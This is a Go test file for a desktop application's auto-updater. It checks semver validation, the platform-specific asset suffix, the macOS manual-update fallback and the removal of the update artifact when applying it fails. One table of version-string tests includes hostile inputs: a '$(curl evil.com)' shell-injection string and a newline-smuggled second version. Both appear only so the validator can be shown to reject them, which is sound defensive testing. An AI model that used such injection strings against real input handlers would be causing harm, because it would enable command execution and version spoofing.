// Tests for the auto-update version-comparison + asset-selection logic.
// The update flow is the most security-critical path in the binary —
// regressions here ship arbitrary code to every install. Tests focus on
// inputs the auto-updater accepts FROM GITHUB (release body, asset names),
// since that's the data path an attacker would target.
package main

import (
	"errors"
	"os"
	"runtime"
	"testing"
)

func TestIsValidSemver(t *testing.T) {
	cases := []struct {
		in   string
		want bool
	}{
		// Valid.
		{"v1.2.3", true},
		{"v0.0.0", true},
		{"v10.20.30", true},
		{"v1.2.3-rc1", true},
		{"v1.2.3-rc1+meta", true},
		{"v1.2.3+build.42", true},

		// Invalid — these are the ones that matter for security: a malicious
		// release body could try to inject these to spoof a version.
		{"", false},
		{"1.2.3", false},            // missing leading v
		{"v1.2", false},             // missing patch
		{"v1.2.3.4", false},         // too many segments
		{"v999.0.0-ATTACK", true},   // technically valid semver — comparison logic must defend
		{"$(curl evil.com)", false}, // shell injection attempt
		{"v1.2.3\nv9.9.9", false},   // newline injection
		{"v 1.2.3", false},          // leading space
		{"v1.2.3 ", false},          // trailing space
		{"latest", false},           // tag name, not semver
	}
	for _, tc := range cases {
		if got := isValidSemver(tc.in); got != tc.want {
			t.Errorf("isValidSemver(%q) = %v, want %v", tc.in, got, tc.want)
		}
	}
}

func TestAssetSuffixForGOOS(t *testing.T) {
	// The actual suffix depends on runtime.GOOS / runtime.GOARCH at test time,
	// which is fine — we just verify the format is sensible for whichever
	// platform the test runs on. The important security property is that the
	// suffix is RESTRICTIVE (a strict suffix match), not whether it's
	// .dmg vs .exe — that's covered by the other matchers.
	got := assetSuffixForGOOS()
	if got == "" {
		t.Fatal("assetSuffixForGOOS returned empty string")
	}
	// Suffix should always start with a dash + GOOS + dash + GOARCH.
	wantPrefix := "-" + runtime.GOOS + "-" + runtime.GOARCH
	if got[:len(wantPrefix)] != wantPrefix {
		t.Errorf("assetSuffixForGOOS()=%q does not start with %q", got, wantPrefix)
	}

	// Known platforms must include a file extension to prevent matching
	// SHA256SUMS or similar side-car files.
	switch runtime.GOOS {
	case "windows":
		if got != "-windows-"+runtime.GOARCH+".exe" {
			t.Errorf("windows suffix = %q, want -windows-%s.exe", got, runtime.GOARCH)
		}
	case "darwin":
		if got != "-darwin-"+runtime.GOARCH+".dmg" {
			t.Errorf("darwin suffix = %q, want -darwin-%s.dmg", got, runtime.GOARCH)
		}
	case "linux":
		if got != "-linux-"+runtime.GOARCH+".AppImage" {
			t.Errorf("linux suffix = %q, want -linux-%s.AppImage", got, runtime.GOARCH)
		}
	}
}

func TestDownloadAndApplyUpdateFallbackOpensAssetWithoutDownload(t *testing.T) {
	prevFlag := silentUpdateCapableFlag
	prevOpen := openManualUpdateURL
	silentUpdateCapableFlag = "false"
	t.Cleanup(func() {
		silentUpdateCapableFlag = prevFlag
		openManualUpdateURL = prevOpen
	})
	if silentUpdateCapable() {
		t.Skip("fallback only applies to non-capable macOS builds")
	}

	const assetURL = "https://example.test/update.dmg"
	opened := ""
	openManualUpdateURL = func(url string) error {
		opened = url
		return nil
	}
	if err := downloadAndApplyUpdate(&UpdateInfo{Available: true, AssetURL: assetURL}); err != nil {
		t.Fatalf("downloadAndApplyUpdate fallback: %v", err)
	}
	if opened != assetURL {
		t.Fatalf("opened URL = %q, want %q", opened, assetURL)
	}
}

func TestApplyManualVerifiedUpdate_RemovesArtifactOnFailure(t *testing.T) {
	artifact, err := os.CreateTemp(t.TempDir(), "verified-update-*")
	if err != nil {
		t.Fatalf("CreateTemp: %v", err)
	}
	path := artifact.Name()
	if err := artifact.Close(); err != nil {
		t.Fatalf("Close: %v", err)
	}

	wantErr := errors.New("apply failed")
	err = applyManualVerifiedUpdate(path, &UpdateInfo{}, func(gotPath string, _ *UpdateInfo) error {
		if gotPath != path {
			t.Fatalf("apply path = %q, want %q", gotPath, path)
		}
		return wantErr
	})
	if !errors.Is(err, wantErr) {
		t.Fatalf("applyManualVerifiedUpdate error = %v, want %v", err, wantErr)
	}
	if _, statErr := os.Stat(path); !errors.Is(statErr, os.ErrNotExist) {
		t.Fatalf("verified artifact still exists after apply failure: %v", statErr)
	}
}
